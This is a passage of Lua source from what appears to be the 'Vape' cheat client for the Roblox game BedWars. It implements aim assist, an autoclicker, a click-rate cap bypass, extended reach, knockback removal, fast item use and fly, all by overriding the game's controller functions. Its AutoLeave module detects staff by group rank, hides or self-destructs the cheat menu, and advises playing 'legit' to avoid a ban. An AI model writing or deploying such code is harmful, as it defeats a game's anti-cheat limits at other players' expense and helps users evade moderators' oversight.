								if AimAssistTargetFrame.Walls.Enabled then 
									if not bedwars.SwordController:canSee({instance = plr.Character, player = plr.Player, getInstance = function() return plr.Character end}) then return end
								end
								gameCamera.CFrame = gameCamera.CFrame:lerp(CFrame.new(gameCamera.CFrame.p, plr.Character.HumanoidRootPart.Position), ((1 / AimSpeed.Value) + (AimAssistStrafe.Enabled and (inputService:IsKeyDown(Enum.KeyCode.A) or inputService:IsKeyDown(Enum.KeyCode.D)) and 0.01 or 0)))
							end
						end
					end
				end)
			else
				RunLoops:UnbindFromRenderStep("AimAssist")
				vapeTargetInfo.Targets.AimAssist = nil
			end
		end,
		HoverText = "Smoothly aims to closest valid target with sword"
	})
	AimAssistTargetFrame = AimAssist.CreateTargetWindow({Default3 = true})
	AimAssistClickAim = AimAssist.CreateToggle({
		Name = "Click Aim",
		Function = function() end,
		Default = true,
		HoverText = "Only aim while mouse is down"
	})
	AimAssistStrafe = AimAssist.CreateToggle({
		Name = "Strafe increase",
		Function = function() end,
		HoverText = "Increase speed while strafing away from target"
	})
	AimSpeed = AimAssist.CreateSlider({
		Name = "Smoothness",
		Min = 1,
		Max = 100, 
		Function = function(val) end,
		Default = 50
	})
end)

runFunction(function()
	local autoclicker = {Enabled = false}
	local noclickdelay = {Enabled = false}
	local autoclickercps = {GetRandomValue = function() return 1 end}
	local autoclickerblocks = {Enabled = false}
	local autoclickertimed = {Enabled = false}
	local autoclickermousedown = false

	local function isNotHoveringOverGui()
		local mousepos = inputService:GetMouseLocation() - Vector2.new(0, 36)
		for i,v in pairs(lplr.PlayerGui:GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
			if v.Active then
				return false
			end
		end
		for i,v in pairs(game:GetService("CoreGui"):GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
			if v.Parent:IsA("ScreenGui") and v.Parent.Enabled then
				if v.Active then
					return false
				end
			end
		end
		return true
	end

	autoclicker = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
		Name = "AutoClicker",
		Function = function(callback)
			if callback then
				table.insert(autoclicker.Connections, inputService.InputBegan:Connect(function(input, gameProcessed)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						autoclickermousedown = true
						local firstClick = tick() + 0.1
						task.spawn(function()
							repeat
								task.wait()
								if entityLibrary.isAlive then
									if not autoclicker.Enabled or not autoclickermousedown then break end
									if not isNotHoveringOverGui() then continue end
									if getOpenApps() > (bedwarsStore.equippedKit == "hannah" and 4 or 3) then continue end
									if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then
										if bedwarsStore.matchState == 0 then continue end
									end
									if bedwarsStore.localHand.Type == "sword" then
										if bedwars.KatanaController.chargingMaid == nil then
											task.spawn(function()
												if firstClick <= tick() then
													bedwars.SwordController:swingSwordAtMouse()
												else
													firstClick = tick()
												end
											end)
											task.wait(math.max((1 / autoclickercps.GetRandomValue()), noclickdelay.Enabled and 0 or (autoclickertimed.Enabled and 0.38 or 0)))
										end
									elseif bedwarsStore.localHand.Type == "block" then 
										if autoclickerblocks.Enabled and bedwars.BlockPlacementController.blockPlacer and firstClick <= tick() then
											if (workspace:GetServerTimeNow() - bedwars.BlockCpsController.lastPlaceTimestamp) > ((1 / 12) * 0.5) then
												local mouseinfo = bedwars.BlockPlacementController.blockPlacer.clientManager:getBlockSelector():getMouseInfo(0)
												if mouseinfo then
													task.spawn(function()
														if mouseinfo.placementPosition == mouseinfo.placementPosition then
															bedwars.BlockPlacementController.blockPlacer:placeBlock(mouseinfo.placementPosition)
														end
													end)
												end
												task.wait((1 / autoclickercps.GetRandomValue()))
											end
										end
									end
								end
							until not autoclicker.Enabled or not autoclickermousedown
						end)
					end
				end))
				table.insert(autoclicker.Connections, inputService.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						autoclickermousedown = false
					end
				end))
			end
		end,
		HoverText = "Hold attack button to automatically click"
	})
	autoclickercps = autoclicker.CreateTwoSlider({
		Name = "CPS",
		Min = 1,
		Max = 20,
		Function = function(val) end,
		Default = 8,
		Default2 = 12
	})
	autoclickertimed = autoclicker.CreateToggle({
		Name = "Timed",
		Function = function() end
	})
	autoclickerblocks = autoclicker.CreateToggle({
		Name = "Place Blocks", 
		Function = function() end, 
		Default = true,
		HoverText = "Automatically places blocks when left click is held."
	})

	local noclickfunc
	noclickdelay = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
		Name = "NoClickDelay",
		Function = function(callback)
			if callback then
				noclickfunc = bedwars.SwordController.isClickingTooFast
				bedwars.SwordController.isClickingTooFast = function(self) 
					self.lastSwing = tick()
					return false 
				end
			else
				bedwars.SwordController.isClickingTooFast = noclickfunc
			end
		end,
		HoverText = "Remove the CPS cap"
	})
end)

runFunction(function()
	local ReachValue = {Value = 14}
	Reach = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
		Name = "Reach",
		Function = function(callback)
			if callback then
				bedwars.CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = ReachValue.Value + 2
			else
				bedwars.CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 14.4
			end
		end, 
		HoverText = "Extends attack reach"
	})
	ReachValue = Reach.CreateSlider({
		Name = "Reach",
		Min = 0,
		Max = 18,
		Function = function(val)
			if Reach.Enabled then
				bedwars.CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = val + 2
			end
		end,
		Default = 18
	})
end)

runFunction(function()
	local Sprint = {Enabled = false}
	local oldSprintFunction
	Sprint = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
		Name = "Sprint",
		Function = function(callback)
			if callback then
				if inputService.TouchEnabled then
					pcall(function() lplr.PlayerGui.MobileUI["2"].Visible = false end)
				end
				oldSprintFunction = bedwars.SprintController.stopSprinting
				bedwars.SprintController.stopSprinting = function(...)
					local originalCall = oldSprintFunction(...)
					bedwars.SprintController:startSprinting()
					return originalCall
				end
				table.insert(Sprint.Connections, lplr.CharacterAdded:Connect(function(char)
					char:WaitForChild("Humanoid", 9e9)
					task.wait(0.5)
					bedwars.SprintController:stopSprinting()
				end))
				task.spawn(function()
					bedwars.SprintController:startSprinting()
				end)
			else
				if inputService.TouchEnabled then
					pcall(function() lplr.PlayerGui.MobileUI["2"].Visible = true end)
				end
				bedwars.SprintController.stopSprinting = oldSprintFunction
				bedwars.SprintController:stopSprinting()
			end
		end,
		HoverText = "Sets your sprinting to true."
	})
end)

runFunction(function()
	local Velocity = {Enabled = false}
	local VelocityHorizontal = {Value = 100}
	local VelocityVertical = {Value = 100}
	local applyKnockback
	Velocity = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
		Name = "Velocity",
		Function = function(callback)
			if callback then
				applyKnockback = bedwars.KnockbackUtil.applyKnockback
				bedwars.KnockbackUtil.applyKnockback = function(root, mass, dir, knockback, ...)
					knockback = knockback or {}
					if VelocityHorizontal.Value == 0 and VelocityVertical.Value == 0 then return end
					knockback.horizontal = (knockback.horizontal or 1) * (VelocityHorizontal.Value / 100)
					knockback.vertical = (knockback.vertical or 1) * (VelocityVertical.Value / 100)
					return applyKnockback(root, mass, dir, knockback, ...)
				end
			else
				bedwars.KnockbackUtil.applyKnockback = applyKnockback
			end
		end,
		HoverText = "Reduces knockback taken"
	})
	VelocityHorizontal = Velocity.CreateSlider({
		Name = "Horizontal",
		Min = 0,
		Max = 100,
		Percent = true,
		Function = function(val) end,
		Default = 0
	})
	VelocityVertical = Velocity.CreateSlider({
		Name = "Vertical",
		Min = 0,
		Max = 100,
		Percent = true,
		Function = function(val) end,
		Default = 0
	})
end)

runFunction(function()
	local AutoLeaveDelay = {Value = 1}
	local AutoPlayAgain = {Enabled = false}
	local AutoLeaveStaff = {Enabled = true}
	local AutoLeaveStaff2 = {Enabled = true}
	local AutoLeaveRandom = {Enabled = false}
	local leaveAttempted = false

	local function getRole(plr)
		local suc, res = pcall(function() return plr:GetRankInGroup(5774246) end)
		if not suc then 
			repeat
				suc, res = pcall(function() return plr:GetRankInGroup(5774246) end)
				task.wait()
			until suc
		end
		if plr.UserId == 1774814725 then 
			return 200
		end
		return res
	end

	local flyAllowedmodules = {"Sprint", "AutoClicker", "AutoReport", "AutoReportV2", "AutoRelic", "AimAssist", "AutoLeave", "Reach"}
	local function autoLeaveAdded(plr)
		task.spawn(function()
			if not shared.VapeFullyLoaded then
				repeat task.wait() until shared.VapeFullyLoaded
			end
			if getRole(plr) >= 100 then
				if AutoLeaveStaff.Enabled then
					if #bedwars.ClientStoreHandler:getState().Party.members > 0 then 
						bedwars.LobbyClientEvents.leaveParty()
					end
					if AutoLeaveStaff2.Enabled then 
						warningNotification("Vape", "Staff Detected : "..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name).." : Play legit like nothing happened to have the highest chance of not getting banned.", 60)
						GuiLibrary.SaveSettings = function() end
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" then
								if table.find(flyAllowedmodules, i:gsub("OptionsButton", "")) == nil and tostring(v.Object.Parent.Parent):find("Render") == nil then
									if v.Api.Enabled then
										v.Api.ToggleButton(false)
									end
									v.Api.SetKeybind("")
									v.Object.TextButton.Visible = false
								end
							end
						end
					else
						GuiLibrary.SelfDestruct()
						game:GetService("StarterGui"):SetCore("SendNotification", {
							Title = "Vape",
							Text = "Staff Detected\n"..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name),
							Duration = 60,
						})
					end
					return
				else
					warningNotification("Vape", "Staff Detected : "..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name), 60)
				end
			end
		end)
	end

	local function isEveryoneDead()
		if #bedwars.ClientStoreHandler:getState().Party.members > 0 then
			for i,v in pairs(bedwars.ClientStoreHandler:getState().Party.members) do
				local plr = playersService:FindFirstChild(v.name)
				if plr and isAlive(plr, true) then
					return false
				end
			end
			return true
		else
			return true
		end
	end

	AutoLeave = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "AutoLeave", 
		Function = function(callback)
			if callback then
				table.insert(AutoLeave.Connections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
					if (not leaveAttempted) and deathTable.finalKill and deathTable.entityInstance == lplr.Character then
						leaveAttempted = true
						if isEveryoneDead() and bedwarsStore.matchState ~= 2 then
							task.wait(1 + (AutoLeaveDelay.Value / 10))
							if bedwars.ClientStoreHandler:getState().Game.customMatch == nil and bedwars.ClientStoreHandler:getState().Party.leader.userId == lplr.UserId then
								if not AutoPlayAgain.Enabled then
									bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
								else
									if AutoLeaveRandom.Enabled then 
										local listofmodes = {}
										for i,v in pairs(bedwars.QueueMeta) do
											if not v.disabled and not v.voiceChatOnly and not v.rankCategory then table.insert(listofmodes, i) end
										end
										bedwars.LobbyClientEvents:joinQueue(listofmodes[math.random(1, #listofmodes)])
									else
										bedwars.LobbyClientEvents:joinQueue(bedwarsStore.queueType)
									end
								end
							end
						end
					end
				end))
				table.insert(AutoLeave.Connections, vapeEvents.MatchEndEvent.Event:Connect(function(deathTable)
					task.wait(AutoLeaveDelay.Value / 10)
					if not AutoLeave.Enabled then return end
					if leaveAttempted then return end
					leaveAttempted = true
					if bedwars.ClientStoreHandler:getState().Game.customMatch == nil and bedwars.ClientStoreHandler:getState().Party.leader.userId == lplr.UserId then
						if not AutoPlayAgain.Enabled then
							bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
						else
							if bedwars.ClientStoreHandler:getState().Party.queueState == 0 then
								if AutoLeaveRandom.Enabled then 
									local listofmodes = {}
									for i,v in pairs(bedwars.QueueMeta) do
										if not v.disabled and not v.voiceChatOnly and not v.rankCategory then table.insert(listofmodes, i) end
									end
									bedwars.LobbyClientEvents:joinQueue(listofmodes[math.random(1, #listofmodes)])
								else
									bedwars.LobbyClientEvents:joinQueue(bedwarsStore.queueType)
								end
							end
						end
					end
				end))
				table.insert(AutoLeave.Connections, playersService.PlayerAdded:Connect(autoLeaveAdded))
				for i, plr in pairs(playersService:GetPlayers()) do
					autoLeaveAdded(plr)
				end
			end
		end,
		HoverText = "Leaves if a staff member joins your game or when the match ends."
	})
	AutoLeaveDelay = AutoLeave.CreateSlider({
		Name = "Delay",
		Min = 0,
		Max = 50,
		Default = 0,
		Function = function() end,
		HoverText = "Delay before going back to the hub."
	})
	AutoPlayAgain = AutoLeave.CreateToggle({
		Name = "Play Again",
		Function = function() end,
		HoverText = "Automatically queues a new game.",
		Default = true
	})
	AutoLeaveStaff = AutoLeave.CreateToggle({
		Name = "Staff",
		Function = function(callback) 
			if AutoLeaveStaff2.Object then 
				AutoLeaveStaff2.Object.Visible = callback
			end
		end,
		HoverText = "Automatically uninjects when staff joins",
		Default = true
	})
	AutoLeaveStaff2 = AutoLeave.CreateToggle({
		Name = "Staff AutoConfig",
		Function = function() end,
		HoverText = "Instead of uninjecting, It will now reconfig vape temporarily to a more legit config.",
		Default = true
	})
	AutoLeaveRandom = AutoLeave.CreateToggle({
		Name = "Random",
		Function = function(callback) end,
		HoverText = "Chooses a random mode"
	})
	AutoLeaveStaff2.Object.Visible = false
end)

runFunction(function()
	local oldclickhold
	local oldclickhold2
	local roact 
	local FastConsume = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "FastConsume",
		Function = function(callback)
			if callback then
				oldclickhold = bedwars.ClickHold.startClick
				oldclickhold2 = bedwars.ClickHold.showProgress
				bedwars.ClickHold.showProgress = function(p5)
					local roact = debug.getupvalue(oldclickhold2, 1)
					local countdown = roact.mount(roact.createElement("ScreenGui", {}, { roact.createElement("Frame", {
						[roact.Ref] = p5.wrapperRef, 
						Size = UDim2.new(0, 0, 0, 0), 
						Position = UDim2.new(0.5, 0, 0.55, 0), 
						AnchorPoint = Vector2.new(0.5, 0), 
						BackgroundColor3 = Color3.fromRGB(0, 0, 0), 
						BackgroundTransparency = 0.8
					}, { roact.createElement("Frame", {
							[roact.Ref] = p5.progressRef, 
							Size = UDim2.new(0, 0, 1, 0), 
							BackgroundColor3 = Color3.fromRGB(255, 255, 255), 
							BackgroundTransparency = 0.5
						}) }) }), lplr:FindFirstChild("PlayerGui"))
					p5.handle = countdown
					local sizetween = tweenService:Create(p5.wrapperRef:getValue(), TweenInfo.new(0.1), {
						Size = UDim2.new(0.11, 0, 0.005, 0)
					})
					table.insert(p5.tweens, sizetween)
					sizetween:Play()
					local countdowntween = tweenService:Create(p5.progressRef:getValue(), TweenInfo.new(p5.durationSeconds * (FastConsumeVal.Value / 40), Enum.EasingStyle.Linear), {
						Size = UDim2.new(1, 0, 1, 0)
					})
					table.insert(p5.tweens, countdowntween)
					countdowntween:Play()
					return countdown
				end
				bedwars.ClickHold.startClick = function(p4)
					p4.startedClickTime = tick()
					local u2 = p4:showProgress()
					local clicktime = p4.startedClickTime
					bedwars.RuntimeLib.Promise.defer(function()
						task.wait(p4.durationSeconds * (FastConsumeVal.Value / 40))
						if u2 == p4.handle and clicktime == p4.startedClickTime and p4.closeOnComplete then
							p4:hideProgress()
							if p4.onComplete ~= nil then
								p4.onComplete()
							end
							if p4.onPartialComplete ~= nil then
								p4.onPartialComplete(1)
							end
							p4.startedClickTime = -1
						end
					end)
				end
			else
				bedwars.ClickHold.startClick = oldclickhold
				bedwars.ClickHold.showProgress = oldclickhold2
				oldclickhold = nil
				oldclickhold2 = nil
			end
		end,
		HoverText = "Use/Consume items quicker."
	})
	FastConsumeVal = FastConsume.CreateSlider({
		Name = "Ticks",
		Min = 0,
		Max = 40,
		Default = 0,
		Function = function() end
	})
end)

local autobankballoon = false
runFunction(function()
	local Fly = {Enabled = false}
	local FlyMode = {Value = "CFrame"}
	local FlyVerticalSpeed = {Value = 40}
	local FlyVertical = {Enabled = true}
	local FlyAutoPop = {Enabled = true}
	local FlyAnyway = {Enabled = false}
	local FlyAnywayProgressBar = {Enabled = false}
	local FlyDamageAnimation = {Enabled = false}
	local FlyTP = {Enabled = false}
	local FlyAnywayProgressBarFrame
	local olddeflate
	local FlyUp = false
	local FlyDown = false
	local FlyCoroutine
	local groundtime = tick()
	local onground = false
	local lastonground = false
	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}

	local function inflateBalloon()
		if not Fly.Enabled then return end
		if entityLibrary.isAlive and (lplr.Character:GetAttribute("InflatedBalloons") or 0) < 1 then
			autobankballoon = true
			if getItem("balloon") then
				bedwars.BalloonController:inflateBalloon()
				return true
			end
		end
		return false
	end

	Fly = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "Fly",
		Function = function(callback)
			if callback then
				olddeflate = bedwars.BalloonController.deflateBalloon
				bedwars.BalloonController.deflateBalloon = function() end

				table.insert(Fly.Connections, inputService.InputBegan:Connect(function(input1)
					if FlyVertical.Enabled and inputService:GetFocusedTextBox() == nil then
						if input1.KeyCode == Enum.KeyCode.Space or input1.KeyCode == Enum.KeyCode.ButtonA then
							FlyUp = true
						end
						if input1.KeyCode == Enum.KeyCode.LeftShift or input1.KeyCode == Enum.KeyCode.ButtonL2 then
							FlyDown = true
						end
					end
				end))
				table.insert(Fly.Connections, inputService.InputEnded:Connect(function(input1)
					if input1.KeyCode == Enum.KeyCode.Space or input1.KeyCode == Enum.KeyCode.ButtonA then
						FlyUp = false
					end
					if input1.KeyCode == Enum.KeyCode.LeftShift or input1.KeyCode == Enum.KeyCode.ButtonL2 then
						FlyDown = false
					end
				end))
				if inputService.TouchEnabled then
					pcall(function()
						local jumpButton = lplr.PlayerGui.TouchGui.TouchControlFrame.JumpButton
						table.insert(Fly.Connections, jumpButton:GetPropertyChangedSignal("ImageRectOffset"):Connect(function()
							FlyUp = jumpButton.ImageRectOffset.X == 146
						end))
						FlyUp = jumpButton.ImageRectOffset.X == 146
					end)
				end
				table.insert(Fly.Connections, vapeEvents.BalloonPopped.Event:Connect(function(poppedTable)
					if poppedTable.inflatedBalloon and poppedTable.inflatedBalloon:GetAttribute("BalloonOwner") == lplr.UserId then 
						lastonground = not onground
						repeat task.wait() until (lplr.Character:GetAttribute("InflatedBalloons") or 0) <= 0 or not Fly.Enabled
						inflateBalloon() 
					end
				end))
				table.insert(Fly.Connections, vapeEvents.AutoBankBalloon.Event:Connect(function()
					repeat task.wait() until getItem("balloon")
					inflateBalloon()
				end))

				local balloons
				if entityLibrary.isAlive and (not bedwarsStore.queueType:find("mega")) then
					balloons = inflateBalloon()
				end
				local megacheck = bedwarsStore.queueType:find("mega") or bedwarsStore.queueType == "winter_event"

				task.spawn(function()
					repeat task.wait() until bedwarsStore.queueType ~= "bedwars_test" or (not Fly.Enabled)
					if not Fly.Enabled then return end
					megacheck = bedwarsStore.queueType:find("mega") or bedwarsStore.queueType == "winter_event"
				end)

				local flyAllowed = entityLibrary.isAlive and ((lplr.Character:GetAttribute("InflatedBalloons") and lplr.Character:GetAttribute("InflatedBalloons") > 0) or bedwarsStore.matchState == 2 or megacheck) and 1 or 0
				if flyAllowed <= 0 and shared.damageanim and (not balloons) then 
					shared.damageanim()
					bedwars.SoundManager:playSound(bedwars.SoundList["DAMAGE_"..math.random(1, 3)])
				end

				if FlyAnywayProgressBarFrame and flyAllowed <= 0 and (not balloons) then 
					FlyAnywayProgressBarFrame.Visible = true
					FlyAnywayProgressBarFrame.Frame:TweenSize(UDim2.new(1, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0, true)
				end

				groundtime = tick() + (2.6 + (entityLibrary.groundTick - tick()))
				FlyCoroutine = coroutine.create(function()
					repeat
						repeat task.wait() until (groundtime - tick()) < 0.6 and not onground
						flyAllowed = ((lplr.Character and lplr.Character:GetAttribute("InflatedBalloons") and lplr.Character:GetAttribute("InflatedBalloons") > 0) or bedwarsStore.matchState == 2 or megacheck) and 1 or 0
						if (not Fly.Enabled) then break end
						local Flytppos = -99999
						if flyAllowed <= 0 and FlyTP.Enabled and entityLibrary.isAlive then 
							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							if ray then 
								Flytppos = entityLibrary.character.HumanoidRootPart.Position.Y
								local args = {entityLibrary.character.HumanoidRootPart.CFrame:GetComponents()}
								args[2] = ray.Position.Y + (entityLibrary.character.HumanoidRootPart.Size.Y / 2) + entityLibrary.character.Humanoid.HipHeight
								entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(unpack(args))
								task.wait(0.12)
								if (not Fly.Enabled) then break end
								flyAllowed = ((lplr.Character and lplr.Character:GetAttribute("InflatedBalloons") and lplr.Character:GetAttribute("InflatedBalloons") > 0) or bedwarsStore.matchState == 2 or megacheck) and 1 or 0
								if flyAllowed <= 0 and Flytppos ~= -99999 and entityLibrary.isAlive then 
									local args = {entityLibrary.character.HumanoidRootPart.CFrame:GetComponents()}
									args[2] = Flytppos
									entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(unpack(args))
								end
							end
						end
					until (not Fly.Enabled)
				end)
				coroutine.resume(FlyCoroutine)

				RunLoops:BindToHeartbeat("Fly", function(delta) 
					if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then 
						if bedwars.matchState == 0 then return end
					end
					if entityLibrary.isAlive then
						local playerMass = (entityLibrary.character.HumanoidRootPart:GetMass() - 1.4) * (delta * 100)
						flyAllowed = ((lplr.Character:GetAttribute("InflatedBalloons") and lplr.Character:GetAttribute("InflatedBalloons") > 0) or bedwarsStore.matchState == 2 or megacheck) and 1 or 0
						playerMass = playerMass + (flyAllowed > 0 and 4 or 0) * (tick() % 0.4 < 0.2 and -1 or 1)

						if FlyAnywayProgressBarFrame then
							FlyAnywayProgressBarFrame.Visible = flyAllowed <= 0
							FlyAnywayProgressBarFrame.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
							FlyAnywayProgressBarFrame.Frame.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
						end

						if flyAllowed <= 0 then 
							local newray = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + Vector3.new(0, (entityLibrary.character.Humanoid.HipHeight * -2) - 1, 0))
							onground = newray and true or false
							if lastonground ~= onground then 
								if (not onground) then 
									groundtime = tick() + (2.6 + (entityLibrary.groundTick - tick()))
									if FlyAnywayProgressBarFrame then 
										FlyAnywayProgressBarFrame.Frame:TweenSize(UDim2.new(0, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, groundtime - tick(), true)
									end
								else
									if FlyAnywayProgressBarFrame then 
										FlyAnywayProgressBarFrame.Frame:TweenSize(UDim2.new(1, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0, true)
									end
								end
							end
							if FlyAnywayProgressBarFrame then 
								FlyAnywayProgressBarFrame.TextLabel.Text = math.max(onground and 2.5 or math.floor((groundtime - tick()) * 10) / 10, 0).."s"
							end
							lastonground = onground
						else
							onground = true
							lastonground = true
						end

						local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (FlyMode.Value == "Normal" and FlySpeed.Value or 20)
						entityLibrary.character.HumanoidRootPart.Velocity = flyVelocity + (Vector3.new(0, playerMass + (FlyUp and FlyVerticalSpeed.Value or 0) + (FlyDown and -FlyVerticalSpeed.Value or 0), 0))
						if FlyMode.Value ~= "Normal" then
							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * ((FlySpeed.Value + getSpeed()) - 20)) * delta
						end
					end
				end)
			else
				pcall(function() coroutine.close(FlyCoroutine) end)
				autobankballoon = false
				waitingforballoon = false
				lastonground = nil
				FlyUp = false
				FlyDown = false
				RunLoops:UnbindFromHeartbeat("Fly")
				if FlyAnywayProgressBarFrame then 
					FlyAnywayProgressBarFrame.Visible = false
				end
				if FlyAutoPop.Enabled then
					if entityLibrary.isAlive and lplr.Character:GetAttribute("InflatedBalloons") then
						for i = 1, lplr.Character:GetAttribute("InflatedBalloons") do
							olddeflate()
						end
					end
				end
				bedwars.BalloonController.deflateBalloon = olddeflate
				olddeflate = nil
			end
		end,
		HoverText = "Makes you go zoom (longer Fly discovered by exelys and Cqded)",
		ExtraText = function() 
			return "Heatseeker"
		end
	})
	FlySpeed = Fly.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 23,
		Function = function(val) end, 
		Default = 23
	})
	FlyVerticalSpeed = Fly.CreateSlider({
		Name = "Vertical Speed",
		Min = 1,
		Max = 100,
		Function = function(val) end, 
		Default = 44
	})
	FlyVertical = Fly.CreateToggle({
		Name = "Y Level",
		Function = function() end, 
		Default = true
	})
	FlyAutoPop = Fly.CreateToggle({
		Name = "Pop Balloon",
		Function = function() end, 
		HoverText = "Pops balloons when Fly is disabled."
	})
	local oldcamupdate
	local camcontrol
	local Flydamagecamera = {Enabled = false}
	FlyDamageAnimation = Fly.CreateToggle({
		Name = "Damage Animation",
		Function = function(callback) 
			if Flydamagecamera.Object then 
				Flydamagecamera.Object.Visible = callback
			end
			if callback then 
				task.spawn(function()
					repeat
						task.wait(0.1)
						for i,v in pairs(getconnections(gameCamera:GetPropertyChangedSignal("CameraType"))) do 
							if v.Function then
								camcontrol = debug.getupvalue(v.Function, 1)
							end
						end
					until camcontrol
					local caminput = require(lplr.PlayerScripts.PlayerModule.CameraModule.CameraInput)
					local num = Instance.new("IntValue")
					local numanim
					shared.damageanim = function()
						if numanim then numanim:Cancel() end
						if Flydamagecamera.Enabled then
							num.Value = 1000
							numanim = tweenService:Create(num, TweenInfo.new(0.5), {Value = 0})
							numanim:Play()
						end
					end
					oldcamupdate = camcontrol.Update
					camcontrol.Update = function(self, dt) 
						if camcontrol.activeCameraController then
							camcontrol.activeCameraController:UpdateMouseBehavior()
							local newCameraCFrame, newCameraFocus = camcontrol.activeCameraController:Update(dt)
							gameCamera.CFrame = newCameraCFrame * CFrame.Angles(0, 0, math.rad(num.Value / 100))
							gameCamera.Focus = newCameraFocus
							if camcontrol.activeTransparencyController then
								camcontrol.activeTransparencyController:Update(dt)
							end
							if caminput.getInputEnabled() then
								caminput.resetInputForFrameEnd()
							end
						end
					end
				end)
			else
				shared.damageanim = nil
				if camcontrol then 
					camcontrol.Update = oldcamupdate
				end
			end
		end
	})
	Flydamagecamera = Fly.CreateToggle({
		Name = "Camera Animation",
		Function = function() end,
		Default = true
	})
	Flydamagecamera.Object.BorderSizePixel = 0
	Flydamagecamera.Object.BackgroundTransparency = 0
	Flydamagecamera.Object.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
	Flydamagecamera.Object.Visible = false
	FlyAnywayProgressBar = Fly.CreateToggle({
		Name = "Progress Bar",
		Function = function(callback) 
			if callback then 
				FlyAnywayProgressBarFrame = Instance.new("Frame")
				FlyAnywayProgressBarFrame.AnchorPoint = Vector2.new(0.5, 0)
				FlyAnywayProgressBarFrame.Position = UDim2.new(0.5, 0, 1, -200)
				FlyAnywayProgressBarFrame.Size = UDim2.new(0.2, 0, 0, 20)
				FlyAnywayProgressBarFrame.BackgroundTransparency = 0.5
				FlyAnywayProgressBarFrame.BorderSizePixel = 0
				FlyAnywayProgressBarFrame.BackgroundColor3 = Color3.new(0, 0, 0)
				FlyAnywayProgressBarFrame.Visible = Fly.Enabled
				FlyAnywayProgressBarFrame.Parent = GuiLibrary.MainGui
				local FlyAnywayProgressBarFrame2 = FlyAnywayProgressBarFrame:Clone()
				FlyAnywayProgressBarFrame2.AnchorPoint = Vector2.new(0, 0)
				FlyAnywayProgressBarFrame2.Position = UDim2.new(0, 0, 0, 0)
				FlyAnywayProgressBarFrame2.Size = UDim2.new(1, 0, 0, 20)
				FlyAnywayProgressBarFrame2.BackgroundTransparency = 0
				FlyAnywayProgressBarFrame2.Visible = true
				FlyAnywayProgressBarFrame2.Parent = FlyAnywayProgressBarFrame
				local FlyAnywayProgressBartext = Instance.new("TextLabel")
				FlyAnywayProgressBartext.Text = "2s"
				FlyAnywayProgressBartext.Font = Enum.Font.Gotham
				FlyAnywayProgressBartext.TextStrokeTransparency = 0
				FlyAnywayProgressBartext.TextColor3 =  Color3.new(0.9, 0.9, 0.9)
				FlyAnywayProgressBartext.TextSize = 20
				FlyAnywayProgressBartext.Size = UDim2.new(1, 0, 1, 0)
				FlyAnywayProgressBartext.BackgroundTransparency = 1
				FlyAnywayProgressBartext.Position = UDim2.new(0, 0, -1, 0)
				FlyAnywayProgressBartext.Parent = FlyAnywayProgressBarFrame
			else
				if FlyAnywayProgressBarFrame then FlyAnywayProgressBarFrame:Destroy() FlyAnywayProgressBarFrame = nil end
			end
		end,
		HoverText = "show amount of Fly time",
		Default = true
	})
	FlyTP = Fly.CreateToggle({
		Name = "TP Down",
		Function = function() end,
		Default = true
	})
end)

runFunction(function()
	local GrappleExploit = {Enabled = false}
	local GrappleExploitMode = {Value = "Normal"}
	local GrappleExploitVerticalSpeed = {Value = 40}
	local GrappleExploitVertical = {Enabled = true}
	local GrappleExploitUp = false
	local GrappleExploitDown = false
